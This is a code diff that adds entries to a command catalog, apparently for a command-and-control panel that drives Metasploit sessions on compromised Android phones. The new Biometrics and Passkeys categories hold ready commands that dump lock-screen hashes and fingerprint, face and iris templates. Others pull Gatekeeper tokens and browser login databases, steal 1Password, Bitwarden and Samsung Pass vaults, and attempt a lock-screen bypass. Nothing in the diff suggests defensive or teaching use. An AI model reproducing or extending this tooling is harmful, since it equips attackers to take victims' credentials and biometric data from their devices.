@@ -244,6 +244,37 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "wifi_passwords",        name: "run post/multi/gather/wifi_credentials",                            category: "Social",    description: "Dump all saved WiFi passwords" },
   { id: "google_auth_tokens",    name: "run post/android/gather/accounts",                                   category: "Social",    description: "Capture Google OAuth tokens" },
   { id: "app_sandbox_all",       name: "run post/android/capture/app_data",                                  category: "Social",    description: "Extract all installed app sandboxes (root)" },
+
+  // ── Biometrics & Lock Screen ──────────────────────────────
+  { id: "bio_dump_lock",         name: "run post/android/gather/lock_screen_info",                           category: "Biometrics", description: "Dump lock screen type, hash, salt, failed attempts" },
+  { id: "bio_gesture_key",       name: "download /data/system/gesture.key",                                  category: "Biometrics", description: "Download pattern lock SHA1 hash file (root)" },
+  { id: "bio_password_key",      name: "download /data/system/password.key",                                 category: "Biometrics", description: "Download PIN/password hash file (root)" },
+  { id: "bio_locksettings",      name: "download /data/system/locksettings.db",                              category: "Biometrics", description: "Download lock settings SQLite DB (salt, type, bypass)" },
+  { id: "bio_bypass_lock",       name: "run post/android/manage/lock_screen_bypass",                         category: "Biometrics", description: "Attempt MSF lock screen bypass module", dangerous: true },
+  { id: "bio_fingerprint_dir",   name: "ls /data/system/users/0/fpdata/",                                    category: "Biometrics", description: "List fingerprint template files (root required)" },
+  { id: "bio_fingerprint_dl",    name: "download -r /data/system/users/0/fpdata/",                           category: "Biometrics", description: "Download all fingerprint template files (root)" },
+  { id: "bio_face_dir",          name: "ls /data/system_de/0/snap_face_data/",                               category: "Biometrics", description: "List face template files (root required)" },
+  { id: "bio_iris_dir",          name: "ls /data/system/users/0/irisdata/",                                  category: "Biometrics", description: "List iris template files (Samsung, root)" },
+  { id: "bio_gatekeeper",        name: "download -r /data/system/gatekeeper/",                               category: "Biometrics", description: "Download Gatekeeper token files (root)" },
+  { id: "bio_enrollment_count",  name: "run post/android/gather/sub_info",                                   category: "Biometrics", description: "Check biometric enrollment status and count" },
+  { id: "bio_samsung_pass",      name: "download /data/data/com.samsung.android.authfw/databases/",          category: "Biometrics", description: "Dump Samsung Pass credential database" },
+  { id: "bio_screen_pin_check",  name: "run post/android/gather/lock_screen_info",                           category: "Biometrics", description: "Check if screen pin/lock is enabled" },
+  { id: "bio_adb_unlock",        name: "execute -f /system/bin/sh -a '-c \"input keyevent 82\"'",           category: "Biometrics", description: "ADB keyevent screen wake/unlock attempt" },
+
+  // ── Passkeys & Credential Vault ───────────────────────────
+  { id: "passkey_keystore_list", name: "run post/android/gather/android_keystore_dumper",                   category: "Passkeys",  description: "List all Android Keystore key aliases" },
+  { id: "passkey_chrome_db",    name: "download /data/data/com.android.chrome/app_chrome/Default/Login\\ Data", category: "Passkeys", description: "Download Chrome Login Data (passwords + passkeys)" },
+  { id: "passkey_chrome_local",  name: "download /data/data/com.android.chrome/app_chrome/Local\\ State",   category: "Passkeys",  description: "Download Chrome Local State (WebAuthn)" },
+  { id: "passkey_chrome_webdata",name: "download /data/data/com.android.chrome/app_chrome/Default/Web\\ Data", category: "Passkeys", description: "Download Chrome Web Data (autofill + passkeys)" },
+  { id: "passkey_google_accounts",name:"run post/android/gather/accounts",                                   category: "Passkeys",  description: "List Google accounts (for passkey sync access)" },
+  { id: "passkey_autofill_db",   name: "download /data/data/com.google.android.gms/databases/",             category: "Passkeys",  description: "Download Google Autofill / Smart Lock DB (root)" },
+  { id: "passkey_firefox_db",    name: "download /data/data/org.mozilla.firefox/files/key4.db",              category: "Passkeys",  description: "Download Firefox key4.db (master key + logins)" },
+  { id: "passkey_firefox_logins",name: "download /data/data/org.mozilla.firefox/files/logins.json",          category: "Passkeys",  description: "Download Firefox logins.json (encrypted creds)" },
+  { id: "passkey_brave_db",      name: "download /data/data/com.brave.browser/app_chrome/Default/Login\\ Data", category: "Passkeys", description: "Download Brave browser credentials" },
+  { id: "passkey_samsung_int",   name: "download /data/data/com.sec.android.app.sbrowser/databases/",       category: "Passkeys",  description: "Download Samsung Internet browser credentials" },
+  { id: "passkey_1password",     name: "download /data/data/com.onepassword.android/databases/",             category: "Passkeys",  description: "Download 1Password encrypted vault DB" },
+  { id: "passkey_bitwarden",     name: "download /data/data/com.x8bit.bitwarden/databases/",                 category: "Passkeys",  description: "Download Bitwarden encrypted vault DB" },
+  { id: "passkey_keepass2",      name: "download -r /sdcard/",                                               category: "Passkeys",  description: "Search sdcard for .kdbx KeePass database files", needsParam: true, paramLabel: "Search path", paramPlaceholder: "/sdcard/" },
 ];
 
 export function getCommandsByCategory(): Record<string, C2Command[]> {
